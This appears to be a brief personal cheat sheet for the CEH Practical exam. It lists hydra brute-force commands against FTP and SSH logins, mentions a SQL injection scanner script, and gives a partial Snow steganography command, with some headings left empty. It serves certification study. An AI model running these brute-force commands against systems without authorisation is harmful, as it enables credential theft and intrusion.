# CEH-Practical

## IP and service enumaration

## Service brute force
### FTP brute force
```bash
hydra -L userlist.txt -P passwordlist.txt ftp://IP-Address -V
```
#### See content
```bash
ftp://IP-Address/folder
```

### SSH brute force
```bash
hydra -L userlist.txt -P passwordlist.txt IP-Address ssh -V
```

## SQL

dsss.py

## Steganography
### Snow
```bash
-C -p password output.txt
```
